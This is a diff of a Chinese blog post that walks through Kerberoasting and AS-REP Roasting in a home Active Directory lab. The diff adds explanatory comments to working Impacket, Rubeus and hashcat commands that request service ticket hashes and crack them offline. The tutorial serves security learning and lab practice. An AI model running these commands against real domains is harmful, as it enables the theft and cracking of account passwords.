@@ -7,7 +7,7 @@
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一漏洞原理>一、漏洞原理</a></li><li><a href=#二影响与危害>二、影响与危害</a></li><li><a href=#三利用--复现>三、利用 / 复现</a><ol><li><a href=#环境准备>环境准备</a></li><li><a href=#kerberoasting-步骤>Kerberoasting 步骤</a></li><li><a href=#as-rep-roasting-步骤>AS-REP Roasting 步骤</a></li><li><a href=#结果验证>结果验证</a></li></ol></li><li><a href=#四检测>四、检测</a></li><li><a href=#五防御>五、防御</a></li><li><a href=#六修复>六、修复</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/>域渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088039/>域渗透：Kerberoasting 与 AS-REP Roasting 实战</a></h2><h3 class=article-subtitle>在本地 AD 靶场实战 Kerberoasting 与 AS-REP Roasting，完整讲解原理、影响、利用、检测、防御与修复。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published datetime=2026-08-29T11:50:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 1 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>Kerberoasting 与 AS-REP Roasting 只能在自建的 AD 域靶场进行。在真实域环境中抓取和破解服务账号密码可能触犯法律。</p><h2 id=一漏洞原理>一、漏洞原理</h2><p>Kerberos 认证时，票据里包含服务账号密码派生的密钥。普通域用户可以合法申请这些票据，但可以拿回本地离线破解。</p><p>两种攻击的本质：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>Kerberoasting 与 AS-REP Roasting 只能在自建的 AD 域靶场进行。在真实域环境中抓取和破解服务账号密码可能触犯法律。</p><h2 id=一漏洞原理>一、漏洞原理</h2><p>Kerberos 认证时，票据里包含服务账号密码派生的密钥。普通域用户可以合法申请这些票据，但可以拿回本地离线破解。</p><p>两种攻击的本质：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Kerberoasting：申请 SPN 服务账号的 TGS 票据 → 破解其密码
 </span></span><span class=line><span class=cl>AS-REP Roasting：对未开预认证的账号申请 TGT → 破解密码
@@ -17,7 +17,7 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>一个普通域用户账号（Kerberoasting）
 </span></span><span class=line><span class=cl>存在 SPN 服务账号（Kerberoasting）
 </span></span><span class=line><span class=cl>存在 DONT_REQ_PREAUTH 账号（AS-REP Roasting）
-</span></span></code></pre></td></tr></table></div></div><h2 id=二影响与危害>二、影响与危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><img src=/img/ad-attack-path.svg alt=域渗透攻击路径图><h2 id=二影响与危害>二、影响与危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -31,37 +31,47 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>域控 + 普通域用户
 </span></span><span class=line><span class=cl>一个 SPN 服务账号（密码设简单，如 P@ssw0rd123）
 </span></span><span class=line><span class=cl>一个关闭预认证的账号
-</span></span></code></pre></td></tr></table></div></div><h3 id=kerberoasting-步骤>Kerberoasting 步骤</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span><span class=lnt>6
-</span><span class=lnt>7
-</span><span class=lnt>8
+</span></span></code></pre></td></tr></table></div></div><h3 id=kerberoasting-步骤>Kerberoasting 步骤</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 找 SPN 服务账号</span>
 </span></span><span class=line><span class=cl>GetUserSPNs.py <span class=s1>&#39;corp.local/user:Pass@123&#39;</span> -dc-ip 192.168.1.10
+</span></span><span class=line><span class=cl><span class=c1># 解释：列出域内可 Kerberoast 的 SPN 服务账号</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># 2. 导出票据哈希</span>
 </span></span><span class=line><span class=cl>GetUserSPNs.py <span class=s1>&#39;corp.local/user:Pass@123&#39;</span> -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
+</span></span><span class=line><span class=cl><span class=c1># 解释：申请 TGS 票据并保存，票据里带服务账号密码哈希</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># 3. 离线破解（模式 13100）</span>
 </span></span><span class=line><span class=cl>hashcat -m <span class=m>13100</span> kerberoast.txt rockyou.txt
+</span></span><span class=line><span class=cl><span class=c1># 解释：13100 是 Kerberoast TGS 哈希模式，rockyou 为字典</span>
 </span></span></code></pre></td></tr></table></div></div><p>域内 Windows 上用 Rubeus：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Rubeus.exe kerberoast
-</span></span></code></pre></td></tr></table></div></div><h3 id=as-rep-roasting-步骤>AS-REP Roasting 步骤</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span><span class=lnt>6
-</span><span class=lnt>7
-</span><span class=lnt>8
+</span></span></code></pre></td></tr></table></div></div><h3 id=as-rep-roasting-步骤>AS-REP Roasting 步骤</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 找关闭预认证的账号</span>
 </span></span><span class=line><span class=cl>GetNPUsers.py <span class=s1>&#39;corp.local/&#39;</span> -usersfile users.txt -dc-ip 192.168.1.10
+</span></span><span class=line><span class=cl><span class=c1># 解释：对用户列表尝试申请 TGT，能成功的就是没开预认证的账号</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># 2. 导出哈希（模式 18200）</span>
 </span></span><span class=line><span class=cl>GetNPUsers.py <span class=s1>&#39;corp.local/&#39;</span> -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.txt
+</span></span><span class=line><span class=cl><span class=c1># 解释：保存 AS-REP 哈希，18200 是 AS-REP 破解模式</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># 3. 破解</span>
 </span></span><span class=line><span class=cl>hashcat -m <span class=m>18200</span> asrep.txt rockyou.txt
